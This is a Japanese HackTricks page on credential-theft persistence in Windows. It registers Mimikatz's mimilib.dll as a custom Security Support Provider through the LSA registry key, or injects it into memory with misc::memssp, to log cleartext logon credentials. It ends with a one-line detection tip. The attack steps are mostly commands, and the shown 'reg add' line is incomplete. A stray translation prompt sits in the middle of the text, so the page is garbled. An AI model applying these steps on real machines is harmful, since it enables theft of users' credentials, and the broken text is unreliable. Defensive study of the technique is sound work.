<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを**共有する**。

</details>


# カスタムSSP

[SSP（セキュリティサポートプロバイダ）とは何かこちらで学ぶ。](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)\
マシンへのアクセスに使用される**クレデンシャル**を**クリアテキスト**で**キャプチャ**するために、独自の**SSP**を作成できます。

### Mimilib

Mimikatzによって提供される`mimilib.dll`バイナリを使用できます。**これは、クリアテキストでのすべてのクレデンシャルをファイル内に記録します。**\
`C:\Windows\System32\`にdllをドロップします。\
既存のLSAセキュリティパッケージのリストを取得します：

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

`mimilib.dll`をセキュリティサポートプロバイダリスト（セキュリティパッケージ）に追加します：
```csharp
PS C:\> reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
以下は、Windowsの強化に関するハッキング技術についてのハッキング書籍の内容です。関連する英語テキストを日本語に翻訳し、まったく同じマークダウンおよびHTML構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどの翻訳は行わないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。

---

そして、再起動後には、`C:\Windows\System32\kiwissp.log`に平文の資格情報が見つかります。

### メモリ内

Mimikatzを使用してこれを直接メモリに注入することもできます（少し不安定になったり機能しない可能性があることに注意してください）：
```csharp
privilege::debug
misc::memssp
```
この操作は再起動後には維持されません。

## 対策

イベントID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` の作成/変更を監査

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
